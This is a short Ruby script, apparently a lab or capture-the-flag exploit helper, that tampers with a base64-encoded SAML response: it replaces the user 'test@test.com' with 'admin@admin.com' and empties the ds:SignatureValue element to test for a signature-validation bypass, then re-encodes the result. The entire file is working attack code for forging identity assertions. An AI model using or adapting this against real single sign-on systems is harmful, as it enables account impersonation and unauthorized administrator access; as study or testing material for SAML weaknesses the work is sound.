require 'cgi'
require 'base64'

str = CGI.unescape ARGV[0]
response = Base64.decode64(str)

#----------------------------------#
# test@test.com -> admin@admin.com #
# We are trying remove signature   #
#----------------------------------#

malicious_response = response.gsub("test@test.com", "admin@admin.com")
without_signature = malicious_response.gsub(/<ds:SignatureValue>.*<\/ds:SignatureValue>/, "<ds:SignatureValue></ds:SignatureValue>")

puts (CGI.escape(Base64.strict_encode64(without_signature))).gsub("+/=","")
